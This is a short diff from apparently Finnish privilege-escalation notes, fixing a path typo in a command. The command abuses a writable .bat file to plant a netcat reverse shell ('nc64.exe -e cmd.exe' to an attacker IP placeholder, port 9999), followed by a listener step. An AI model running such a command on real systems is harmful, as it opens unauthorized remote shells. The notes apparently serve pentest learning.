@@ -60,7 +60,7 @@ icacls C:\polku\tiedostoon\scripti.bat
 ```
 Jos esim. \USERS -käyttäjillä kirjoitusoikeudet, voidaan tehdä reverse shell netcatilla:
 ```cmd
-echo c:\polku\netcatiin\nc64.exe -e cmd.exe *Hyökkääjän IP* 9999 > C:\polku\scrriptiin\scripti.bat
+echo c:\polku\netcatiin\nc64.exe -e cmd.exe *Hyökkääjän IP* 9999 > C:\polku\scriptiin\scripti.bat
 ```
 Netcat -kuuntelumoodiin omalle koneelle porttiin 9999:
 ```cmd
